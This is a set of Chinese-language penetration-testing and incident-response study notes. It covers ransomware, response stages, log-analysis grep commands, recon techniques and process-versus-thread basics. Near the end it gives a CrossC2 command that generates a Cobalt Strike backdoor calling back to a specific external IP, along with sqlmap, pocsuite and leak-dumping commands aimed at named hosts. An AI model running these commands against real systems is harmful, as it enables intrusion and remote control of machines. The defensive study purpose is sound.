这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解
lesuobingdu.360.cn，https://www.nomoreransom.org/zh/index.html 等可进行解密勒索，分析病毒
中了勒索病毒之后，电脑所有的文件都被加密，无法使用



###### 如何防范勒索病毒？

查看官方给的补丁，及时打补丁，不下载恶意程序
勒索病毒的传输主要是不经意间下载了某些程序



### 34.应急响应的步骤：

保护阶段：主要是断网，防止对方的继续渗透
分析阶段：通过给出的时间来分析日志信息，判断对方的攻击行为
复现阶段：复现对方的攻击，对方到底是怎样将数据传输到服务器的，利用了哪个漏洞
修复阶段：打上合适的补丁，或者修改相关配置文件，部署WAF等操作
建议阶段：怎么能有效的防止下次的攻击



###### 怎么寻找日志的存储路径？

一般对方的服务器默认会开启，不论是宝塔还是mysql，都会有存储
通过配置文件或者包含文件去查到这个文件目录，然后对日志进行分析



###### 分析sql注入有什么技巧？SQL注入有哪些危害？

可以分析相关的关键字在日志文件中全局搜索，如select，insert，sqlmap，pwd
或者对方遗留在web上的后门文件中的特殊命名，以及后门中的一些关键信息，以及对方的IP
将对方在什么时候干了什么事，以何种方式达到的目的，利用了哪些漏洞都分析出来
对方通过sql注入不仅可以弱口令，sql注入，提升权限，窃取备份，
而且当其权限提高到服务器权限时，甚至可以删除服务器的日志
需要确定sql日志是否为开启状态，分析时可以通过当个日志人为分析，也可借助其他工具



###### 日志分析的工具有哪些？如何检测自己的服务器上有没有payload？

大数据分析平台ELK和spunk，前者可以直接用docker进行搭建
用360星图可以图形化的分析一些简单的日志
windows上的日志用fileseek可以批量进行搜索查询
logfusion可以分析一些网站服务器或日志的信息，判断什么时候被爆破，进行追朔



###### 筛选到了漏洞之后如何防护？

尝试跟随攻击者的exp进行复现，搜索相关补丁或者转移端口，开启更多的WAF规则等

日志被删除了有什么办法恢复日志信息？日志被删除且无法恢复的情况下应该怎么做应急处理？
靠自己的办法是没有办法恢复的，需要去找一些收费的产品恢复日志，如果没有日志，则需要从红队的角度出发，查看自己服务器的漏洞
查看自己服务器有哪些可以利用的exp，并一一去验证这些漏洞的真实存在性



### 35.Linux-grep 筛选：

统计了下日志，确认服务器遭受多少次暴力破解
grep -o "Failed password" /var/log/secure|uniq -c
输出登录爆破的第一行和最后一行，确认爆破时间范围：
grep "Failed password" /var/log/secure|head -1
grep "Failed password" /var/log/secure|tail -1
进一步定位有哪些 IP 在爆破？
grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9[0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c | sort -nr
爆破用户名字典都有哪些？
grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr
登录成功的日期、用户名、 IP：
grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more



###### linux服务器怎么走自己的代理？

根据橘子云官方的配置文件，将自己的clash订阅链接拿到，并且启动clash
export https_proxy="socks5://127.0.0.1:7890" && export http_proxy="http://127.0.0.1:7890"
curl -vv www.google.com检验自己是否能上外网

linux机器在cs中上线：
linux 借助 CrossC2 项目： netstat -ntulp
https://github.com/gloxec/CrossC2
参考过程： http://www.adminxe.com/1287.html
项目上传至服务端目录，给予执行权限
配置监听器： windows/beacon_https/reverse_https 端口放行
生成后门：./genCrossC2.Linux 110.42.178.227 5566 null null Linux x64 C2
通过网络监听工具及 windows 日志分析或执行记录查找后门问题



### 36.根据端口查服务：

linux：netstat -tunlp | grep 5000
windows：netstat -aon | findstr "端口号"	tasklist|findstr "PID"

###### 进程和线程的区别：

做个简单的比喻：进程=火车，线程=车厢
线程在进程下行进（单纯的车厢无法运行）
一个进程可以包含多个线程（一辆火车可以有多个车厢）
不同进程间数据很难共享（一辆火车上的乘客很难换到另外一辆火车，比如站点换乘）
同一进程下不同线程间数据很易共享（A车厢换到B车厢很容易）
进程要比线程消耗更多的计算机资源（采用多列火车相比多个车厢更耗资源）
进程间不会相互影响，一个线程挂掉将导致整个进程挂掉（一列火车不会影响到另外一列火车，但是如果一列火车上中间的一节车厢着火了，将影响到所有车厢）
进程可以拓展到多机，进程最多适合多核（不同火车可以开在多个轨道上，同一火车的车厢不能在行进的不同的轨道上）
进程使用的内存地址可以上锁，即一个线程使用某些共享内存时，其他线程必须等它结束，才能使用这一块内存。（比如火车上的洗手间）－"互斥锁"
进程使用的内存地址可以限定使用量（比如火车上的餐厅，最多只允许多少人进入，如果满了需要在门口等，等有人出来了才能进去）－“信号量”



### 36.根据pocsuite指定自己的脚本进行测试，判断有没有此漏洞，进行漏洞验证

```
python cli.py -u http://42.200.64.221:4848/ -r weblogic_selef.py --verify
根据可能注入的sql注入点，进行sqlmap的批量测试
python sqlmapapi.py -s
python sqlmapapi1.py
```

id -> root(0) -> 程序用户(1~499) -> 普通用户(500~65545)
win命令 -> net user -> netstat start -> netstat -an -> whoami -> id -> tasklist /svc -> type 
安卓测试 -> 抓包 + 反编译 + 提取url
IP扫描 -> 域名站点往往比IP站点的解析少一级 -> ip扫描源码备份可能性高一些
信息收集 -> 目录型网站、端口类网站、子域名网站、同类公司网站、whois查询、第三方接口或界面
cms查询 -> python cmseek.py -u http://1.117.52.219:8000
子域名查询 -> python3 oneforall.py --target chentuo.asia run
源码泄漏 -> windows chentuo.asia.zip 或rar / linux chentuo.asia.tar.gz 扫描目录
.git泄漏 -> python2 Githack.py http://chentuo.asia/.git/
.svn泄漏 -> 目录网站.svn如有资源,python3 SvnExploit.py -u http:/127.0.0.1/.svn --dump
web.xml泄漏 -> WEB-INF/classes/cn/abc/servlet/DownloadServlet.class 下载文件一般是post方式
github搜索 -> 在源码中发现敏感的qq或者身份信息，利用github进行搜索获取敏感代码
waf识别 ->  python3 wafw00f/main.py http://www.chentuo.asia
旁注查网站 -> 同一ip不同网址 https://webscan.cc/site_xyh.sdju.edu.cn/
C段查网站 -> 同一网段不同ip https://chapangzhan.com/210.35.68.0/24
ip反查 -> 利用ip获取服务器解析域名
cdn查询 -> nslookup ，http://17ce.com/，https://www.wepcc.com/web.html ，情报社区查历史解析
cdn绕过 -> 子域名，去掉www，邮件服务器，国外访问，APP抓包，修改hosts，相关漏洞，扫全网，fuckcdn
arl信息收集 -> https://110.42.178.227:5003/
